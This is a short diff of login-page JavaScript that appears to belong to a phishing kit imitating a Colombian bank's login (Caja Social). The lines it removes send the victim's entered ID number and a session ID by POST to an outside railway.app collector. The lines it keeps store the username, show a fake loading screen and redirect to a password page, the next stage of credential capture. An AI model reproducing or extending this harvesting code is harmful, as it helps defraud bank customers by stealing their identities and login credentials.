@@ -104,25 +104,11 @@
                     sessionStorage.setItem('sessionId', sessionId);
                     sessionStorage.setItem('usuario', value);
                     
-                    fetch('https://multi-bancos-production.up.railway.app/caja-social/enviar', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            sessionId: sessionId,
-                            tipo: 'Usuario',
-                            tipoDoc: 'CC',
-                            identificacion: value,
-                            clave: ''
-                        })
-                    }).then(function(r){ return r.json(); })
-                      .then(function(data){ console.log('Enviado:', data); })
-                      .catch(function(err){ console.error('Error:', err); });
-                    
                     var pantalla = document.getElementById('pantallaCarga');
                     if (pantalla) pantalla.classList.add('activa');
                     setTimeout(function(){
                         window.location.href = 'password.html';
-                    }, 1500);
+                    }, 1000);
                 } else {
                     errorMsg.style.display = 'block';
                     usuarioInput.classList.add('error');
